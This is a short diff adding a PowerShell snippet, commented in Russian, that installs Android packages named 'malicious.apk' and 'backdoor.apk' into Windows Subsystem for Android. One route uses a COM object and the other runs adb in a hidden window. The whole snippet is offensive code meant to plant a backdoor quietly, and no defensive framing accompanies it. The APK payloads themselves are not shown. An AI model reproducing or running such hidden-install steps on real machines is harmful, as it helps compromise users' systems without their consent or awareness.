@@ -1,0 +1,10 @@
+# Windows Subsystem for Android имеет отдельные права
+# 1. Устанавливаем APK с уязвимостью
+$wsatools = New-Object -ComObject "Microsoft.WSA.Tools" -ErrorAction SilentlyContinue
+if ($wsatools) {
+    $wsatools.InstallPackage("C:\temp\malicious.apk", $true)
+    # APK может содержать код, эксплуатирующий связку Android-Windows
+}
+
+# 2. Или через ADB (Android Debug Bridge)
+Start-Process "adb.exe" -ArgumentList "install C:\temp\backdoor.apk" -WindowStyle Hidden
